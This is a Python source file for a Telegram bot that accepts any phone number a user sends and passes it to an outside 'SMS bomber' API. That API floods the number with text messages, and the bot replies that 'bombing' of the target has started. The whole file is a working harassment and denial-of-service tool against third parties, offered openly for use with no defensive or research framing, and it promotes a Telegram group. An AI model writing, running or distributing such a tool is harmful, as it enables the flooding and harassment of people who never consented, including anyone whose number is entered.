import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

API_URL = "https://tcsbomberai.vercel.app/api/smsbomber"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 Ready to start SMS Bombing? Send me any phone number! 💥")

async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if len(phone) < 10:  # Simple check for phone number length
        await update.message.reply_text("😤 Send me a real number, no bullshit!")
        return
    
    response = requests.get(f"{API_URL}?phone={phone}")
    if response.status_code == 200:
        data = response.json()

        msg = f"""💥 BOMBER ON FIRE! 🔥
📲 Target: {data['phone']}
💣 Bombing started, let's get this shit moving!

⚡️ Wanna join more? [Link](https://t.me/+moHG4GzOgY05MTA1)
"""
        await update.message.reply_text(msg)
    else:
        await update.message.reply_text("💥 Something went wrong. Try again!")

if __name__ == '__main__':
    bot_token = input("Enter your bot token: ")

    app = ApplicationBuilder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_number))

    print("🔥 Bomber bot activated... Ready to explode! 💥")
    app.run_polling()
